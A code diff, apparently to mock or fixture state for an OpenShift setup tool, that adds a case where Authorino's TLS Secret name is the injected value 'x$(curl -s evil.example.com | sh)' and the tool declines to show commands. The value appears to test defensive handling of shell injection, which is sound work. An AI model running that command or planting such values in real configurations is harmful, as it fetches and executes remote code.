@@ -919,7 +919,7 @@ export const MAAS_INFRA = "redhat-ai-gateway-infra";
 export const MAAS_AUTHORINO_COMMANDS = `oc annotate service authorino-authorino-authorization -n kuadrant-system \\
   service.beta.openshift.io/serving-cert-secret-name=authorino-server-cert --overwrite
 oc patch authorino authorino -n kuadrant-system --type=merge \\
-  -p '{"spec":{"listener":{"tls":{"enabled":true,"certSecretRef":{"name":"authorino-server-cert"}}}}}'
+  -p '{"spec":{"listener":{"tls":{"certSecretRef":{"name":"authorino-server-cert"},"enabled":true}}}}'
 oc -n kuadrant-system set env deployment/authorino \\
   SSL_CERT_FILE=/var/run/secrets/kubernetes.io/serviceaccount/service-ca.crt \\
   REQUESTS_CA_BUNDLE=/var/run/secrets/kubernetes.io/serviceaccount/service-ca.crt
@@ -943,7 +943,9 @@ export function maasParts(state, { tls = true } = {}) {
     { id: "gateway", title: "Gateway maas-default-gateway", docUrl: `${MAAS_DOCS}install/maas-setup.md#create-gateway`,
       ...(on ? { state: "ready", message: "Programmed at a1b2c3.elb.us-east-1.amazonaws.com", managedByTool: tool, notManaged: !tool }
         : { state: "missing", message: `Setup creates it with an external load balancer at https://maas.${APPS}` }) },
-    tls ? { id: "authorino-tls", title: "Authorino TLS", docUrl: `${MAAS_DOCS}install/maas-setup.md#create-gateway`, state: "ready", message: "Authorino in kuadrant-system serves TLS and trusts the service CA", notManaged: true }
+    tls === "invalid-secret" ? { id: "authorino-tls", title: "Authorino TLS", docUrl: `${MAAS_DOCS}install/maas-setup.md#create-gateway`, state: "manual", notManaged: true,
+      message: "Not configured: the Service's serving certificate. Authorino's CR names its certificate Secret \"x$(curl -s evil.example.com | sh)\" (spec.listener.tls.certSecretRef.name), which is not a valid Kubernetes name, so no commands are shown. A cluster-admin checks Authorino authorino in kuadrant-system. Without it, API keys are refused." }
+    : tls ? { id: "authorino-tls", title: "Authorino TLS", docUrl: `${MAAS_DOCS}install/maas-setup.md#create-gateway`, state: "ready", message: "Authorino in kuadrant-system serves TLS and trusts the service CA", notManaged: true }
       : { id: "authorino-tls", title: "Authorino TLS", docUrl: `${MAAS_DOCS}install/maas-setup.md#create-gateway`, state: "manual", notManaged: true, commands: MAAS_AUTHORINO_COMMANDS,
         message: "Not configured: trust of the service CA (SSL_CERT_FILE). A cluster-admin runs the docs' setup-authorino-tls.sh commands below (this tool does not change Connectivity Link's Authorino). Without it, API keys are refused." },
     { id: "maas-api", title: "MaaS API (maas-api)", docUrl: `${MAAS_DOCS}install/validation.md`,
